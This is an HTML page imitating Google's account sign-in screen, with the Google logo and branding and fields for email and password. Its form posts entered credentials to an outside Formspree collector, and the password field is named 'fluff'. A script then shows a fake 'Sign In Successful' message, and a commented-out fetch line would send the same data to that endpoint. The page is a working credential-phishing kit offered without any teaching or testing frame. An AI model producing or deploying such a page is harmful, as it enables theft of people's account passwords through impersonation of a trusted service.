<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Google account</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* General Styles */
        body {
            background-color: #1e1f20;
            color: black;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .container {
            background-color: #0e0e0e;
            padding: 20px;
            border-radius: 20px;
            width: 90%;
            max-width: 480px;
            height: auto;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            font-size: 44px;
            font-weight: 700;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 50px;
            margin-right: 10px;
        }

        .text-container {
            text-align: center;
            margin-bottom: 20px;
        }

        #signinText {
            font-size: 24px;
            font-weight: 400;
        }

        #useGoogleText {
            font-size: 14px;
            font-weight: 500;
        }

        .input-box {
            width: 100%;
            padding: 16px;
            border: 1px solid #c6c7c5;
            background-color: #0e0e0d;
            color: #c4c8c5;
            border-radius: 5px;
            font-size: 16px;
            margin-bottom: 12px;
            border-color: #e4e4e3;
        }

        .input-box::placeholder {
            color: #c4c8c5;
        }

        .link {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-email-link {
            margin-top: 5px;
            align-self: flex-start;
            font-weight: 300;
        }

        .guest-mode {
            font-size: 12px;
            color: white;
            text-align: center;
            margin-top: 10px;
        }

        .guest-mode-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            align-items: stretch;
            margin-top: 30px;
            width: 100%;
            gap: 15px;
        }

        .btn {
            background: #8ab4f8;
            color: black;
            padding: 12px;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 100;
        }

        /* Footer Section */
        .footer {
            margin-top: 20px;
            font-size: 12px;
            text-align: center;
            color: white;
            width: 100%;
            font-weight: 500;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            margin-top: 5px;
        }

        .footer a {
            color: white;
            text-decoration: none;
            margin: 0 8px;
        }

        .success-page {
            display: none;
            text-align: center;
            color: white;
        }

        .success-page h1 {
            font-size: 30px;
        }

        .success-page p {
            font-size: 18px;
        }

    </style>
</head>
<body>
    <div class="container" id="signinBox">
        <div class="logo">
            <img src="https://storage.googleapis.com/libraries-lib-production/images/GoogleLogo-canvas-404-300px.original.png" alt="Google Logo">
        </div>

        <div class="text-container">
            <p id="signinText">Sign in</p>
            <p id="useGoogleText">Use your Google Account</p>
        </div>

        <div class="right-side-container">
            <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST" onsubmit="submitForm(event)">
                <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username">
                <div id="passwordContainer" style="display: none;">
                    <label for="fluff" id="passwordLabel">Password</label>
                    <input type="password" id="passwordInput" name="fluff" class="input-box" placeholder="Enter your password" autocomplete="current-password">
                </div>

                <a href="#" class="link forgot-email-link" id="forgotEmailLink">Forgot email?</a>

                <div class="guest-mode-wrapper">
                    <div class="guest-mode">
                        Not your computer? Use a private browsing window to sign in. <br>
                        <a href="#" class="link">Learn more about using Guest mode</a>
                    </div>
                </div>

                <div class="btn-container">
                    <a href="#" class="link" id="createAccountLink">Create account</a>
                    <button type="submit" class="btn" id="nextButton">Next</button>
                </div>
            </form>
        </div>
    </div>

    <div class="success-page" id="successPage">
        <h1>Sign In Successful</h1>
        <p>You have successfully signed in!</p>
        <a href="#" class="btn" onclick="reloadPage()">Go to Dashboard</a>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">English (United Kingdom)</a> |
            <a href="#">Help</a> |
            <a href="#">Privacy</a> |
            <a href="#">Terms</a>
        </div>
    </div>

    <script>
        function submitForm(event) {
            event.preventDefault();

            // Hide the sign-in form
            document.getElementById('signinBox').style.display = 'none';

            // Show the success page
            document.getElementById('successPage').style.display = 'block';

            // You can also submit the form via JavaScript here if needed (to formspree, etc.)
            // Example: 
            // fetch('https://formspree.io/f/moveakwr', { method: 'POST', body: new FormData(event.target) });
        }

        function reloadPage() {
            // Reload the page or redirect the user to another page after successful sign-in
            window.location.href = '/dashboard'; // Replace with the URL of your actual dashboard or desired page
        }
    </script>
</body>
</html>
